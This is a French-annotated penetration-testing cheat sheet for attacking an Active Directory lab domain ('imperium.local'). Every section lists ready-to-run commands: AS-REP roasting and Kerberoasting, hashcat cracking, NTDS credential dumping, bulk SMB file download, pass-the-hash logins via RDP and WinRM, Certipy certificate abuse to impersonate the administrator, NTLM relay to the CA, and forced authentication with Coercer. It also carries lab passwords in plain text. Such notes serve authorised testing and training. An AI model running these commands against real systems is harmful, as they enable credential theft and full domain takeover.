## NXC

```bash
nxc smb $IP $ ## Check domain info

nxc smb $IP -u $USER -p $PASSWORD ## Auth SMB 

nxc smb $IP -u $USER -p $PASSWORD --shares ## Liste share smb

nxc ldap $IP -u $USER -p "" -d $DOMAIN --asreproast <file> ## AS-REP roasting 

nxc ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --users ## enum user LDAP

nxc ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --groups ## enum groupe LDAP

nxc ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --user <USER> ## Info user LDAP

nxc winrm $IP -u $USER -p $PASSWORD ## Connexion WinRM

nxc winrm $IP -u $USER -p $PASSWORD --ntds --user ADMINISTRATOR ## Dump ntds
```

## smbclient

```bash
smbclient //$IP/NAME-SHARE$ -U "$DOMAIN/$USER%$PASSWORD" ## Connexion share SMB

## Pour tout récupérer 
smb: \> recurse ON  
smb: \> prompt OFF  
smb: \> mget *

```

## Hashcat

```bash
hashcat -m 18200 asrep.txt /opt/lists/rockyou.txt ## Crack le hash AS-REP
hashcat -m 13100 hash.txt /opt/lists/rockyou.txt ## Crack le hash Kerberos


```

## Bloodhound

```bash
bloodhound-python -u $USER -p $PASSWORD -d $DOMAIN -ns $IP -c All --zip ## Récupération des éléments de l'AD

bloodhound-ce &>/dev/null & ## Interface Web
user: admin
mdp: @PentestAD1234!!

```

## GetUsersSPN

```bash
GetUserSPNs.py imperium.local/$USER:$PASSWORD -dc-ip $IP -request-user thufir.hawat ## Récupérer ticket kerberos 
```

## RDP

```bash
xfreerdp /u:$USER /pth:$NT_HASH /d:$DOMAIN /v:$IP
```

## WinRM

```bash
evil-winrm -i $IP -u $USER -H $NT_HASH
```

## Certipy

```bash
certipy find -u $USER -p $PASSWORD -dc-ip 10.2.62.87 -vulnerable -stdout  # Énumère les certificats AD CS et affiche les templates vulnérables (ESC1–ESC8, etc.)

certipy req -u $USER -p $PASSWORD -ca 'IMPERIUM-CA' -template 'InterstellarTransport' -upn 'administrator@imperium.local' -dc-ip 10.2.62.87 -target-ip $IP -sid 'S-1-5-21-61666187-1038195267-148027601-500'  # Demande un certificat en usurpant l’identité de l’admin via un template vulnérable

certipy -debug auth -pfx administrator.pfx -domain imperium.local -dc-ip 10.2.62.87 -ldap-shell  # Utilise le certificat pour s’authentifier comme le compte cible et ouvrir un shell LDAP

certipy relay -target http://10.2.62.84/certsrv/certfnsh.asp -template 'DomainController'  # Relaye une authentification NTLM vers la CA pour obtenir un certificat de type Domain Controller (ESC8)
 
```

## Coercer

```bash
coercer coerce -u 'FEYDRAUTHA.HARKONNEN' -p 'schrauth101' -d imperium.local --target-ip 10.2.62.87 --listener-ip 10.2.62.90  # Force la machine cible à s’authentifier vers ton listener pour capturer une authentification NTLM (coercition)
```